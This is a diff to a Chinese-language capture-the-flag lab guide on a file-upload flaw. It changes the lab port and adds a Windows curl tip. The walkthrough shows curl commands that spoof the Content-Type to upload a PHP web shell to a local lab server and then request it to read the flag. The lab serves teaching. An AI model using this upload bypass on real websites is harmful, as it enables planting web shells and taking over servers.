@@ -8,7 +8,7 @@
 |---|---|
 | 考点 | 文件上传、`Content-Type` 可伪造、上传目录可访问 |
 | 难度 | 2 |
-| 端口 | 8086 |
+| 端口 | 8091 |
 | Flag 格式 | `flag{...}` |
 
 一句话：服务端只用 `Content-Type` 判断「是不是图片」，而这个值**是客户端自己填的**。
@@ -17,10 +17,14 @@
 
 ## 二、启动环境
 
+> ⚠️ **Windows PowerShell 5.1 用户注意**：`curl` 在那里是 `Invoke-WebRequest` 的别名，
+> 敲 `curl -H "A: B"` 会报「无法绑定参数 Headers」。请改用 **`curl.exe`**（Windows 10 1803+ 自带）。
+> 完整命令对照表见总 README 的「**在 Windows 上怎么敲这些命令**」一节。
+
 ```bash
 cd upload-ctf
 docker compose up -d --build
-# 浏览器打开 http://127.0.0.1:8086/
+# 浏览器打开 http://127.0.0.1:8091/
 ```
 
 ## 三、手把手解题
@@ -53,7 +57,7 @@ docker compose up -d --build
 ### Step 3｜伪造 Content-Type 再传（curl 一行搞定）
 
 ```bash
-curl -F "f=@shell.php;type=image/png" http://127.0.0.1:8086/
+curl.exe -F "f=@shell.php;type=image/png" http://127.0.0.1:8091/
 ```
 
 `;type=image/png` 就是在 multipart 里把这一段的 `Content-Type` 写死成图片。
@@ -79,7 +83,7 @@ Content-Type: application/x-php        ← 改成 image/png
 ### Step 5｜访问木马，拿 flag
 
 ```bash
-curl http://127.0.0.1:8086/uploads/shell.php
+curl http://127.0.0.1:8091/uploads/shell.php
 ```
 
 直接回显 `flag{...}`。
